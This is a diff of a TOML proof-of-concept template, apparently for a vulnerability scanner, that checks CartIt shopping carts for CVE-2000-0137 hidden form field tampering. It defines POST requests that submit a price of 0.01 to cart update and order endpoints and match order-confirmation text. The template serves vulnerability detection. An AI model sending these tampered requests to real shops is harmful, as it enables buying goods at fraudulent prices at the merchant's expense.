@@ -1,13 +1,13 @@
 [info]
-author = "ave"
-description = "检测 CartIt 购物车系统是否存在隐藏表单字段篡改漏洞。攻击者通过拦截并修改购物车表单提交中的隐藏字段（如商品价格、数量、总价等），服务端未对客户端提交的敏感字段进行完整性校验，可导致低价或免费购买商品。PoC 发送包含篡改后隐藏字段的 POST 请求，验证服务端是否信任客户端提交的隐藏参数。"
+author = "AVE"
+description = "检测 CartIt 购物车应用是否存在隐藏表单字段安全绕过漏洞。攻击者通过修改 POST 请求中隐藏字段（如 price、quantity、total）的值，可篡改订单金额实现低价购买。该漏洞无需身份认证，仅需构造特制 HTTP 请求即可利用。"
 id = "POC-AVE-2000-0122"
-name = "CartIt Hidden Form Field Tampering PoC"
+name = "CartIt 购物车隐藏表单字段篡改 PoC"
 severity = "high"
 tags = [
     "cve-2000-0137",
-    "form-tampering",
     "shopping-cart",
+    "form-tampering",
 ]
 vuln_id = [
     "CVE-2000-0137",
@@ -15,27 +15,60 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cart.cgi"
+path = "/{{BaseURL}}/cart/update.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "item=1001&quantity=1&price=0.01&total=0.01&action=add"
+content = "item_id=1&quantity=1&price=0.01&total=0.01"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "added to your cart",
+    "total",
     "order total",
     "checkout",
-    "CartIt",
+    "subtotal",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "0.01",
+    "0.00",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cart/order.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "product_id=1&qty=1&price=0.01"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "thank you",
+    "order confirmed",
+    "order received",
 ]
